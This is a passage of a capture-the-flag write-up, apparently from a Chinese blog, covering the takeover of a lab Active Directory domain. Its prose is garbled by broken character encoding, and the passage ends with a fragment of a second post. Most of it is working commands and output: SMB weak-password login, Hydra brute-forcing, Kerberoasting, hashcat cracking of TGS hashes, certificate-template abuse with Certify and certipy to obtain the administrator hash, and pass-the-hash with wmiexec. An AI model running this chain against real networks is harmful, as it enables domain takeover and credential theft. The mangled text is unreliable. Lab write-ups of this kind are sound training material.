ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]\n[2025-04-17 00:40:11] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.7:88 =>\n[2025-04-17 00:40:12] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.19:80 => [http] ç‰ˆæœ¬:1.18.0 äº§å“:nginx ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu\n[2025-04-17 00:40:12] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.26:445 =>\n[2025-04-17 00:40:12] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.7:80 => [http]\n[2025-04-17 00:40:12] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.7:445 =>\n[2025-04-17 00:40:12] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.7:389 =>\n[2025-04-17 00:40:12] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.7:139 =>  Banner:[.]\n[2025-04-17 00:40:12] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.26:139 =>  Banner:[.]\n[2025-04-17 00:40:12] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.47:80 => [http]\n[2025-04-17 00:41:07] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.47:445 =>\n[2025-04-17 00:41:07] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.47:139 =>\n[2025-04-17 00:41:12] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.7:135 =>\n[2025-04-17 00:41:12] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.26:135 =>\n[2025-04-17 00:41:12] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 16\n[2025-04-17 00:41:12] [INFO] å¼€å§‹æ¼æ´æ‰«æ\n[2025-04-17 00:41:12] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ftp, ldap, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle\n[2025-04-17 00:41:12] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.9.19        çŠ¶æ€ç :200 é•¿åº¦:612    æ ‡é¢˜:Welcome to nginx!\n[2025-04-17 00:41:12] [SUCCESS] NetInfo æ‰«æç»“æœ\nç›®æ ‡ä¸»æœº: 172.22.9.26\nä¸»æœºå: DESKTOP-CBKTVMO\nå‘ç°çš„ç½‘ç»œæ¥å£:\n   IPv4åœ°å€:\n      â””â”€ 172.22.9.26\n[2025-04-17 00:41:12] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.9.47        çŠ¶æ€ç :200 é•¿åº¦:10918  æ ‡é¢˜:Apache2 Ubuntu Default Page: It works\n[2025-04-17 00:41:12] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.9.7         çŠ¶æ€ç :200 é•¿åº¦:703    æ ‡é¢˜:IIS Windows Server\n[2025-04-17 00:41:12] [SUCCESS] NetBios 172.22.9.7      DC:XIAORANG\\XIAORANG-DC\n[2025-04-17 00:41:12] [SUCCESS] NetInfo æ‰«æç»“æœ\nç›®æ ‡ä¸»æœº: 172.22.9.7\nä¸»æœºå: XIAORANG-DC\nå‘ç°çš„ç½‘ç»œæ¥å£:\n   IPv4åœ°å€:\n      â””â”€ 172.22.9.7\n[2025-04-17 00:41:12] [SUCCESS] NetBios 172.22.9.26     DESKTOP-CBKTVMO.xiaorang.lab        Windows Server 2016 Datacenter 14393\n[2025-04-17 00:41:12] [SUCCESS] SMBè®¤è¯æˆåŠŸ 172.22.9.47:445 administrator:123456\n[2025-04-17 00:41:12] [INFO] ç³»ç»Ÿä¿¡æ¯ 172.22.9.47 [Windows 6.1]\n[2025-04-17 00:41:12] [SUCCESS] NetBios 172.22.9.47     fileserver                          Windows 6.1\n[2025-04-17 00:41:12] [INFO] SMB2å…±äº«ä¿¡æ¯ 172.22.9.47:445 administrator Pass:123456 å…±äº«:[print$ fileshare IPC$]\n[2025-04-17 00:41:12] [SUCCESS] ç›®æ ‡: http://172.22.9.7:80\n  æ¼æ´ç±»å‹: poc-yaml-active-directory-certsrv-detect\n  æ¼æ´åç§°:\n  è¯¦ç»†ä¿¡æ¯:\n        author:AgeloVito\n        links:https://www.cnblogs.com/EasonJim/p/6859345.html\n~~~\n\nä¸Šæ¥å°±æ‰«åˆ°åŸŸæ§çš„æ¼æ´äº†ï¼Œä½†æ˜¯ç°åœ¨è¿˜æ²¡æœ‰ä»€ä¹ˆå¯ç”¨çš„ä¿¡æ¯æ²¡åŠæ³•ç›´æ¥æ‰“ã€‚\n\n172.22.9.47:445 smbæœåŠ¡å­˜åœ¨ä¸€ä¸ªå¼±å£ä»¤ç™»é™†ä¸€ä¸‹çœ‹çœ‹\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# smbclient //172.22.9.47/fileshare -U administrator%123465\nTry \"help\" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Wed Jul 13 04:12:10 2022\n  ..                                  D        0  Wed Jul 13 00:35:09 2022\n  personnel.db                        A    61440  Wed Jul 13 03:46:55 2022\n  secret                              D        0  Wed Apr 16 11:57:06 2025\n  Certified_Pre-Owned.7z              N  9572925  Wed Jul 13 04:12:03 2022\n  Certified_Pre-Owned.pdf             N 10406101  Wed Jul 13 04:08:14 2022\n\n                41152812 blocks of size 1024. 36033208 blocks available\nsmb: \\> cd ..\nsmb: \\> ls\n  .                                   D        0  Wed Jul 13 04:12:10 2022\n  ..                                  D        0  Wed Jul 13 00:35:09 2022\n  personnel.db                        A    61440  Wed Jul 13 03:46:55 2022\n  secret                              D        0  Wed Apr 16 11:57:06 2025\n  Certified_Pre-Owned.7z              N  9572925  Wed Jul 13 04:12:03 2022\n  Certified_Pre-Owned.pdf             N 10406101  Wed Jul 13 04:08:14 2022\n\n                41152812 blocks of size 1024. 36033208 blocks available\nsmb: \\> cd secret\nsmb: \\secret\\> ls\n  .                                   D        0  Wed Apr 16 11:57:06 2025\n  ..                                  D        0  Wed Jul 13 04:12:10 2022\n  flag02.txt                          N      659  Wed Apr 16 11:57:06 2025\n\n                41152812 blocks of size 1024. 36033208 blocks available\n~~~\n\næ‰¾åˆ°flag02äº†\n\n# FLAG3&FLAG4\n\nflag02.txté‡Œè¿˜ç»™äº†ä¸€ä¸ªæç¤º\n\n~~~\nYes, you have enumerated smb. But do you know what an SPN is?\n~~~\n\næŠŠæ‰€æœ‰æ–‡ä»¶éƒ½ä¸‹è½½ä¸‹æ¥çœ‹ä¸€çœ‹,\n\n~~~\nsqlite> select * from xr_users ;\n1|admin|admin\n2|******|i9XDE02pLVf\n3|******|6N70jt2K9sV\n4|******|fiAzGwEMgTY\nsqlite> select * from xr_members ;\n1|huangmin|1|26|15220647319|huangmin@xiaorang.lab\n2|zhangrong|1|36|13073815024|zhangrong@xiaorang.lab\n3|liying|1|29|13126874319|liying@xiaorang.lab\n4|zhaoli|1|44|13075613024|zhaoli@xiaorang.lab\n5|zhangyan|0|35|15254139260|zhangyan@xiaorang.lab\n6|zhoujing|1|32|15123481906|zhoujing@xiaorang.lab\n7|liuying|1|24|13078310649|liuying@xiaorang.lab\n.......\n~~~\n\n personnel.dbé‡Œé¢æœ‰ç”¨æˆ·å’Œ3ä¸ªä¸çŸ¥é“ç”¨æˆ·åçš„å¯†ç ï¼Œå…ˆå°†æ•°æ®å¤„ç†ä¸€ä¸‹å§ï¼Œå°†xr_userså’Œxr_membersçš„å†…å®¹åˆ†åˆ«ä¿å­˜åˆ°passå’Œuseré‡Œ\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# cat pass|awk -F'|' '{print($3)}'>pass.txt\n\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# cat pass.txt\nadmin\ni9XDE02pLVf\n6N70jt2K9sV\nfiAzGwEMgTY\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# cat user|awk -F'|' '{print($2)}' >username.txt\n\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# cat username.txt\nhuangmin\nzhangrong\nliying\nzhaoli\nzhangyan\nzhoujing\nliuying\nwanghao\nwangqiang\nwanglu\nzhaoyong\nzhangli\nwangning\nwangyu\n...\n~~~\n\nç”¨hydraçˆ†ç ´ï¼Œå¯ä»¥çˆ†ç ´å‡ºæ¥ä¸¤ä¸ªç”¨æˆ·\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# hydra -L username.txt  -P pass.txt 172.22.9.26 smb\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-16 13:02:49\n[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)\n[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore\n[DATA] max 1 task per 1 server, overall 1 task, 1236 login tries (l:309/p:4), ~1236 tries per task\n[DATA] attacking smb://172.22.9.26:445/\n[445][smb] host: 172.22.9.26   login: zhangjian   password: i9XDE02pLVf\n[445][smb] host: 172.22.9.26   login: liupeng   password: fiAzGwEMgTY\n~~~\n\nç„¶åè¿›è¡ŒKerberoastæ”»å‡»\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\nServicePrincipalName                   Name      MemberOf  PasswordLastSet             LastLogon  Delegation\n-------------------------------------  --------  --------  --------------------------  ---------  ----------\nTERMSERV/desktop-cbktvmo.xiaorang.lab  zhangxia            2023-07-14 00:45:45.213944  <never>\nWWW/desktop-cbktvmo.xiaorang.lab/IIS   zhangxia            2023-07-14 00:45:45.213944  <never>\nTERMSERV/win2016.xiaorang.lab          chenchen            2023-07-14 00:45:39.767035  <never>\n\n\n\n[-] CCache file is not found. Skipping...\n$krb5tgs$23$*zhangxia$XIAORANG.LAB$xiaorang.lab/zhangxia*$d0a75403c0fd68eb28e523ec82bbcc13$5d435dfada83bc3decd547576a2e0e533633be1ba2ca116bf3944fce42987d3a695c18247303f24a3f5b295919ed0bd0a682c106b81a1e733cf5b27d8816b85b5506c6cd1c04a7eefb3a12f46c00f1483854c51afb647d8fd064e86bc839305531c7a2cd3639f0b79fe070b1c3d10135ee7fc258f1abecec4bcad5d82c3b6a1031235a312c34e669df79ad94ed4a5ddd19f8919e26d5cbe49108176f7a1f52b21a438be962732cd3c7dfbd709b3ee3b7f0ffd4f8817aef4da2ebd5f2339538a6ee44a6e455a0d0ef760238d871f2a01d742aadf0a6dab09e4dac1b37fa317ef49f0bc9ed332df6a15eceabb304cae0d04df2e349ea41f193c8c41c9bbc8876db2cb6edf7ea19dffcbaa75b2e8cc062d873b7697397ae963d8454d867983429b9a24371a2b7b2ded8bb30454fc5c0c92346d0a00f706a04a3fab6a4dd59760f53107727237a316546634868fc926f582409cad4b4ab5674ef0994c60a1256b9677b9069818967813c3cd508a71e6e10fef1ddcbec756bb24cd1ed1d47ba09bed8d199398bf40cb19ecb0298342ca5eb67091f99a66c1cf2b62cb2fea208df89e75245d570e3e6617889d2c3f65be9c64747c21b2cdae4d1f9b06bdd921c46668c433952d0297d575e04e053e33f6251407793efc6e781406a2342a82d4a1939538883c6dff90f8c7845e140332b37efc66cb4d38f7ad7a4d3c66ef6c2d20b56e8de9a5db8db344e18a72a86f7b0447752356e35f6bc97cf328221921735aa58772dc5b800db10ccd461c95783887ad9a065b7b360365b03e5966f9886fd4b5db3472db78c2a7f514f767984e2944a89912e7d4d0bc8c56e7043b9f4bcebe6ea9d1fe4a6715630f1362b2ae5bf62f25c45d3a9fe2ac85e61728c57d1940f21ed763c403d21794e80bace45f553be48d3d367616d735dfc517573d75a418518e90f28c621b3fc614c1e89a7a7a07056a6a849587666ea91dd6b649d7f73356b8c4807f453b0d3209a52f3b99f81012a76dd0ff159d968dd15ad4c7c035792cd1d56f7c537418a3b466b0f6fa2038b159999f2620b20e14f452d3dee9052fac011c78eb3bff235ea41f85aa82e56c8fca3c626a18255f47c40e3e20ddf3c34083f99e9005b61efaa61f939786a024a86e5f56ee1920a452f7f74a66f8ddbfac75eebfd468bc99b2266d2638d7fbf9dae6ba76b36f97cb452eee2bc129553b5c7725b1dc5a6f91a0d67e9cfb3079024ac0c7379a8b1f6eb76223d021233bf75b8279d7d4b01211dbd4b3baaa1c566b945fd757cbe0e8eee3f7ca8df0e2133848109d16df8fddf6b2e62922c9eca4c980cc6949ed145a146b7d1e2ca5fed6c1b378f4963afb15e8c02120467c33f3b30dec45c39da63c7f847513ea72614af712ccb867c6fb31fc135f9690d543a34f6bba84114d71915c021e9a8ade8a50a96c311940bd680e314f4bc8c5a90376b5a313000d497372e4278713368219da610794a1fe1ff560f6c36f4b31e70b63a06c8\n$krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$756eb4d4a5fe99658d9e4329a03d65a5$7ac1c23cb3d99bb83a38e222924cacfb56f615a4f9b9024b7c8e0879221f744b82ca58662adb97a7a3aa3f7cc6a0095f1b3e8f1cbb2e89433341f2399b12841eba64593a74ce3d6ea849ed9dbb5bda3918470942af00817782299bcb2c44c5b9723aaecf746cf760466f47fdfe5aecf6586e249f0bf305d437747b27e29d2a78d78a897fdb0cfe05a903d35e8e8c31f74091fa6b0886ca297c5ae56b656a67f0dee88e9bcfc8f720f172bfcb8df630ad566a2118f7b862f460fb9a28afee2f3e92069bc8bd3862d0812e3fca7991d851238ca3872cb190d091e3cca90adf4da38d364bc759831d0e61fd2a17864389989b4b1dd49d6ddabc60619d6788947bea7ac1a6040e201e362cbefbff3adb78434a80c66511ef8860493dc94dea833b94bf9b6477a986485e4ee3ab05c91d1ab6ffb8679247bcbfea6c2b51fc15a4ce37ce815e2a7a6185ee09f3bcb05e0c3d31b65d642c3a8cf7546125d03260500675da2efe3c15c234a2bc9f5139a3612d521ad0e8315b3bcde7c3f628c723222c20d19937c8a3497ca4763326686a54c619c2d730e03a6a3247615f4ebde209c7a1e87c1c351fdbf16afb6268755646e14dd2f0ee14a977c4bf1ad0231fc7e4a33ec018e790b5a8d103c9a2ba9f8f0877929c54eda6ffcd936658f2e876273ba5eeef5066ea031c1176bbf365a88e8627f4143173155e5a93920e5722d93054ab1d3596fab388acca607372a94f427a2b7555d6d7e2a0fde397de943b9c34b9d2f9f552dea129a2e1120137ff2a2894e4f19725ad4b282c5be4fe370f428ab9ee0b7bcb30d5ab0a334726edd459ce838630ef6905f6a91640ea3096ca2ebe18691f956c7d017c437aa6219ba880d9948daf8738f30af06b5c6038763dbe9e4b6abf29cdb5ebd742fdf7b334817a29f4a927ce294db573acfb69a7b9b3d4b34e758d0ee3901633c13b15365b3aa50db5cd66ac1a83ed3230dcd3396510eed1554ef6dddd485ae97d4b2385a60833a104672a55b3740a8b57c1f9dfe167fe1e16c6f2c4446c3297ef067441a5a536db4697f979e246cb3abb5aa46a41cc140ccf89b23b503e5975f2cd845e4822a0b1d7b240d6c63e225278745e97c2e32ce7ca1efb2d911c4076911b78fe26adaf5d2289b5e0e76cb0ff50e20e61a8ff76cd0ea14275cb64cb34c219c7a9b4cea7fa0255848fecefa0849a32ffa14f3491e7f83ad092506f123b16df02eb00090e12b2bb5b60291ef8a9d57d6d3fd8505ddf799fa0a56e6309b03f372002090da40e7419e75629c0b518ac4d011b709fcf7866c1a581b7e0a5ac0ae28af906d7b95334c1098eeb3ec94a4e3623b72f60a53182d6f02d60790642400e687954328e1224c473bf010f3c73fd3184269f4cf3d9cb91178a962cb085f3dd45abb794437fbb348904fb12440e7c6ed237d97422ddbde2b0ef6c912a4c4ff86b4153a266f103dd9d69b8806d44e57f0271fa6db4b6b02021a0bdd55ee38323fc9f8d7bbb0a8b\n~~~\n\nå¯ä»¥æ‹¿åˆ°ä¸¤ä¸ªç”¨æˆ·çš„hashï¼Œç”¨hashcatçˆ†ç ´\n\n~~~~\nhashcat  hash /usr/share/wordlists/rockyou.txt\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# hashcat  hash --show\nHash-mode was not specified with -m. Attempting to auto-detect hash mode.\nThe following mode was auto-detected as the only one matching your input hash:\n\n13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol\n\nNOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!\nDo NOT report auto-detect issues unless you are certain of the hash type.\n\n$krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$2fef93477c96377b81b856c0a918b0f8$7b12ec73692a807cdb959eaeabd253a016b9a6617e9e882016aeba5e5c1f28e4e1d9bb1ce3cfedba110b3c628726b1b50585672544354fae17ec956eff2e27c39494cf3a08d7ab530114273c7d2332866c1483791d6a32b0fea66422abd61412b64b6bd672e30cf844a1da47c8c1cf6791e00abadb34423301ead5ba16fd13631a7a2e29bafaaa9d55a6f9063ef06838953339018d2a077e7c4db47fec5c341c2c53562bf772bd047f5035aade21b9c0c2ad8dc1eec04aa2a1f9e120c6f1508b734895b0ac1cf384ee3b01ffc723b963826221c291f0fbedf92c8f42d549c611b547d1a5bd2cb93c149b8fb01ecc0d785ca8615d49f2d77015c4431d3a122d723936f57e7abb137ce18d22ced5690de6fc3daa6c45f81f97a4427a8c9adb6665eb3ed0010961f38a8860aaaba72a49b67ec435f7ada78ccab514b6c4e465bf0a9b3c14f3e62f580b79d811d2814e3c952dd9a7cacf451632035e1f819a0289913b6f536d317a920b025da509fec7ad356b4d62d892080a87274e2cda87823971f719275afa7b00615cb43e00c586dc09d2f48d909944d352ef0f1b96b74e924c33b4d7a71618c6aaeea94c7b1b61fdc3cbda2b3a0074942a982e7c63258b58ffc74ca532760ad3da4d1b3f5275330457877de4d840477b03c1dbef4ab68bfbfc0400bb63082c9fdc3ca13cc89a8b91846e06d69a8d713aa7e184cc7ed888df935d42580969a9bb00fd61887bd7c55eca669e14ef8705fcb9d5515218c991935c5b37973b363ba58453543a7033e1869d6e1f4304c1887274b04bbe3bea1a24556698ba5fb21218100cfbd73fc5d09e424786f6e64b39e36c7d86b751c502d9f101a368e575c0be0fe4660db85b5d8c13af3c06c870bf3db18e9e7056256d29b153fc6724f6778c8502b763178a34d1fcd67c172d9a943f0a55b972b0d68f0d9507cfbd8acac33d5b340c6db1728a6ff79537e91c9fde40764b79448cf5f122080d770a860baf50a76a08076ac52de4d671cc8bd84f79bda7c0a52988b62a2954f7fe274ab0ad008cdbf8c3710d7d9cd263d9479c3309de5fec18ce56758e056dcfd942500adea9a14da3555e29e9277f8ca07af73299f70472137f7cd045b60f639f14b3bcfcf635c4ec0c0359c4d7238121af36fa7fb29316d4a45890c0973e432fb2b617256cfeec85c8496c506e79c31e4507eaf5ecc7d67540eed5fec810cdcf6d1682156597450c27b27ad617fdf0fd03abe04d181e58cec2af1edc85e243102c8db404aaaca939c42a54d633585eb7e26348ff26951c5cc8c6271d227520fdea38033174b4efddf6a589688223b263e8808fdbc85bbe20ea471fb529216d802776dcc3a7ef68334059213d49640da993c067719c0b119f9c3914295dedefcbd89f0facf3ba3700227de362e49f88302bf87e4cfc5787b364951e3301efa5ff817f5dbf372536ec3aa4:@Passw0rd@\n~~~~\n\nç„¶åç”¨`chenchen@xiaorang.lab:@Passw0rd@`è¿›è¡Œè¿œç¨‹æ¡Œé¢ç™»å½•,ç”¨bloodhoundè¿›è¡Œä¿¡æ¯æœé›†ï¼ˆå…¶å®ä¹Ÿä¸ç”¨ï¼Œå› ä¸ºä¹‹å‰fscanå·²ç»æ‰«åˆ°æ´äº†ï¼‰\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# bloodhound-python -u chenchen -p @Passw0rd@ -d xiaorang.lab  -c all --dns-tcp -ns 172.22.9.7 --auth-method ntlm --zip\nINFO: Found AD domain: xiaorang.lab\nINFO: Connecting to LDAP server: xiaorang-dc.xiaorang.lab\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 2 computers\nINFO: Connecting to LDAP server: xiaorang-dc.xiaorang.lab\nINFO: Found 95 users\nINFO: Found 52 groups\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: DESKTOP-CBKTVMO.xiaorang.lab\nINFO: Querying computer: XIAORANG-DC.xiaorang.lab\nINFO: Done in 00M 06S\nINFO: Compressing output into 20250416132802_bloodhound.zip\n\n~~~\n\nä¸Šä¼ Certify.exeæŸ¥æ‰¾æ˜“å—æ”»å‡»çš„è¯ä¹¦\n\n~~~\n\nC:\\Users\\chenchen\\Desktop\\æ–°å»ºæ–‡ä»¶å¤¹>Certify.exe find /vulnerable\n\n   _____          _   _  __\n  / ____|        | | (_)/ _|\n | |     ___ _ __| |_ _| |_ _   _\n | |    / _ \\ '__| __| |  _| | | |\n | |___|  __/ |  | |_| | | | |_| |\n  \\_____\\___|_|   \\__|_|_|  \\__, |\n                             __/ |\n                            |___./\n  v1.0.0\n\n[*] Action: Find certificate templates\n[*] Using the search base 'CN=Configuration,DC=xiaorang,DC=lab'\n\n[*] Listing info about the Enterprise CA 'xiaorang-XIAORANG-DC-CA'\n\n    Enterprise CA Name            : xiaorang-XIAORANG-DC-CA\n    DNS Hostname                  : XIAORANG-DC.xiaorang.lab\n    FullName                      : XIAORANG-DC.xiaorang.lab\\xiaorang-XIAORANG-DC-CA\n    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED\n    Cert SubjectName              : CN=xiaorang-XIAORANG-DC-CA, DC=xiaorang, DC=lab\n    Cert Thumbprint               : 37BFD9FE73CA81E18E7A87CEBD90AF267E57170E\n    Cert Serial                   : 43A73F4A37050EAA4E29C0D95BC84BB5\n    Cert Start Date               : 2023/7/14 12:33:21\n    Cert End Date                 : 2028/7/14 12:43:21\n    Cert Chain                    : CN=xiaorang-XIAORANG-DC-CA,DC=xiaorang,DC=lab\n    UserSpecifiedSAN              : Disabled\n    CA Permissions                :\n      Owner: BUILTIN\\Administrators        S-1-5-32-544\n\n      Access Rights                                     Principal\n\n      Allow  Enroll                                     NT AUTHORITY\\Authenticated UsersS-1-5-11\n      Allow  ManageCA, ManageCertificates               BUILTIN\\Administrators        S-1-5-32-544\n      Allow  ManageCA, ManageCertificates               XIAORANG\\Domain Admins        S-1-5-21-990187620-235975882-534697781-512\n      Allow  ManageCA, ManageCertificates               XIAORANG\\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519\n    Enrollment Agent Restrictions : None\n\n[!] Vulnerable Certificates Templates :\n\n    CA Name                               : XIAORANG-DC.xiaorang.lab\\xiaorang-XIAORANG-DC-CA\n    Template Name                         : XR Manager\n    Schema Version                        : 2\n    Validity Period                       : 1 year\n    Renewal Period                        : 6 weeks\n    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT\n    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS\n    Authorized Signatures Required        : 0\n    pkiextendedkeyusage                   : å®‰å…¨ç”µå­é‚®ä»¶, åŠ å¯†æ–‡ä»¶ç³»ç»Ÿ, å®¢æˆ·ç«¯èº«ä»½éªŒè¯\n    mspki-certificate-application-policy  : å®‰å…¨ç”µå­é‚®ä»¶, åŠ å¯†æ–‡ä»¶ç³»ç»Ÿ, å®¢æˆ·ç«¯èº«ä»½éªŒè¯\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights           : NT AUTHORITY\\Authenticated UsersS-1-5-11\n                                      XIAORANG\\Domain Admins        S-1-5-21-990187620-235975882-534697781-512\n                                      XIAORANG\\Domain Users         S-1-5-21-990187620-235975882-534697781-513\n                                      XIAORANG\\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519\n      Object Control Permissions\n        Owner                       : XIAORANG\\Administrator        S-1-5-21-990187620-235975882-534697781-500\n        WriteOwner Principals       : XIAORANG\\Administrator        S-1-5-21-990187620-235975882-534697781-500\n                                      XIAORANG\\Domain Admins        S-1-5-21-990187620-235975882-534697781-512\n                                      XIAORANG\\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519\n        WriteDacl Principals        : XIAORANG\\Administrator        S-1-5-21-990187620-235975882-534697781-500\n                                      XIAORANG\\Domain Admins        S-1-5-21-990187620-235975882-534697781-512\n                                      XIAORANG\\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519\n        WriteProperty Principals    : XIAORANG\\Administrator        S-1-5-21-990187620-235975882-534697781-500\n                                      XIAORANG\\Domain Admins        S-1-5-21-990187620-235975882-534697781-512\n                                      XIAORANG\\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519\n\n\n\nCertify completed in 00:00:10.1629693\n~~~\n\n~~~\n    CA Name                               : XIAORANG-DC.xiaorang.lab\\xiaorang-XIAORANG-DC-CA\n    Template Name                         : XR Manage\n~~~\n\nè¿™ä¸ªå¯ä»¥æ‰“\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# certipy-ad req -u 'liupeng@xiaorang.lab' -p 'fiAzGwEMgTY' -target 172.22.9.7 -dc-ip 172.22.9.7 -ca \"xiaorang-XIAORANG-DC-CA\" -t\nemplate 'XR Manager'  -upn administrator@xiaorang.lab\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Successfully requested certificate\n[*] Request ID is 7\n[*] Got certificate with UPN 'administrator@xiaorang.lab'\n[*] Certificate has no object SID\n[*] Saved certificate and private key to 'administrator.pfx'\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# certipy-ad auth -pfx administrator.pfx -dc-ip 172.22.9.7\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Using principal: administrator@xiaorang.lab\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'administrator.ccache'\n[*] Trying to retrieve NT hash for 'administrator'\n[*] Got hash for 'administrator@xiaorang.lab': aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80\n~~~\n\nå¾—åˆ°äº†administratorçš„å“ˆå¸Œäº†ï¼Œæ‹¿ä¸‹åŸŸæ§äº†ï¼Œç›´æ¥ç™»å½•è¿™å°ä¸»æœºå’ŒåŸŸæ§æ‹¿flagå³å¯\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# impacket-wmiexec  -hashes aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.7\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# impacket-wmiexec  --hashes aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 administrator@172.22.9.26\n~~~\n\n","tags":["é¶æœº"],"categories":["æ˜¥ç§‹äº‘é•œ"]},{"title":"æ˜¥ç§‹äº‘é•œ-Brute4Road","url":"/2025/04/15/æ˜¥ç§‹äº‘é•œ-Brute4Road/","content":"\n\n\n\n\n# FLAG1&FLAG2\n\nå…ˆç”¨fscanæ‰«ä¸€ä¸‹\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# ../pentest/fscan/fscan2 -h 39.99.231.184\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚    ___                              _        â”‚\nâ”‚   / _ \\     ___  ___ _ __ __ _  ___| | __    â”‚\nâ”‚  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    â”‚\nâ”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     â”‚\nâ”‚ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n      Fscan Version: 2.0.0\n\n[2025-04-15 02:37:33] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1\n[2025-04-15 02:37:33] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ\n[2025-04-15 02:37:33] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 1\n[2025-04-15 02:37:33] [INFO] å¼€å§‹ä¸»æœºæ‰«æ\n[2025-04-15 02:37:33] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233\n[2025-04-15 02:37:33] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.231.184:6379\n[2025-04-15 02:37:33] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.231.184:80\n[2025-04-15 02:37:33] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.231.184:21\n[2025-04-15 02:37:33] [SUCCESS] ç«¯å£å¼€æ”¾ 